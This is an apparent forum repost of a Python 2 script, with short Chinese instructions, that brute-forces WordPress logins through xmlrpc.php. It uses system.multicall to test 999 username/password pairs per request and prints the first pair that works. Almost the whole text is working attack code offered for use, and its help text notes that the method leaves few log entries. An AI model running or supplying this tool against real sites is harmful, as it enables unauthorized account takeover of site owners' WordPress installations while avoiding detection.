接：https://forum.90sec.org/forum.php?mod=viewthread&tid=8813

功能OK，现在是遇到成功就退出不会跑完，需要跑完自行删掉exit()

# coding=utf-8
# author:c4bbage@qq.com
# weibo:[url=http://weibo.com/s4turnus]http://weibo.com/s4turnus[/url]
 
import requests
import httplib
import urlparse
import io
import argparse
 
 
def post(host, pl, port=80,  path='/xmlrpc.php'):
    postHead = {"Host": host, "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0、c4bbage@weisuo", "X-Forwarded-For": host, 'Content-Type':
                'application/x-www-form-urlencoded', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Connection': 'keep-alive'}
    postcontent = '''<?xml version="1.0"?>
        <methodCall><methodName>system.multicall</methodName> <params><param><value><array><data>[pl]     </data>
        </array>   </value>    </param>    </params>    </methodCall>
        '''
    resultHtml = httplib.HTTPConnection(host.split(":")[0], port, False)
    resultHtml.request(
        'POST', path, body=postcontent.replace('[pl]', pl), headers=postHead)
    page = resultHtml.getresponse()
    pageConect = page.read()
    return pageConect
 
 
def main():
    parser = argparse.ArgumentParser(
        description='wordpress brute force tool. This is a multi-group account password request. A request Riga one thousand group account password no problem. Xmlrpc will log a few logs.. \nby c4bbage [url]http://weibo.com/s4turnus'[/url])
 
    parser.add_argument('-t',
                        action="store",
                        dest="url",
                        required=True,
                        help='exp: -t [url]http://weisuo.org/xmlrpc.php'[/url]
                        )
    parser.add_argument('-u',
                        action="store",
                        dest="userfile",
                        required=True,
                        help='exp: -u username.txt',
                        type=argparse.FileType('r')
                        )
    parser.add_argument('-p',
                        action="store",
                        dest="pwdfile",
                        required=True,
                        help='exp: -p password.txt',
                        type=argparse.FileType('r')
                        )
 
    args = parser.parse_args()
    url = urlparse.urlparse(args.url)
    userfile = args.userfile
    pwdfile = args.pwdfile
    if(url.netloc.find(':') > 0):
        urlport = url.netloc.split(":")[1]
    else:
        urlport = 80
    # 每个请求999组账号密码
    t = 999
    users = userfile.readlines()
    pwds = pwdfile.readlines()
    pl = '''
    <value><struct><member>
        <name>methodName</name>
            <value><string>wp.getCategories</string></value>
            </member>
        <member>
        <name>params</name>
        <value><array><data>
            <value><string>1</string></value>
            <value><string>[username]</string></value>
            <value><string>[pwd]</string></value>
        </data></array></value>
    </member></struct></value>'''
 
    up = [[u.strip(), p.strip()] for u in users for p in pwds]
    i = 0
    apl = ''
    while i <= len(up) / t:
        apl = ''
        s = i * t
        for a in up[s:s + t]:
            apl += pl.replace('[username]', a[0]).replace('[pwd]', a[1])
            pass
        res = post(host=url.netloc, port=urlport, pl=apl, path=url.path)
        #   提取结果
        if(res.find("categoryDescription") > 0):
            rr = 0
            for r in res.split("</struct></value>"):
                if(r.find("categoryDescription") > 0):
                    print up[s:s + t][rr] 
                    # 成功后退出
                    exit()
                    pass
                rr += 1
        i += 1
        pass
 
if __name__ == '__main__':
    main()
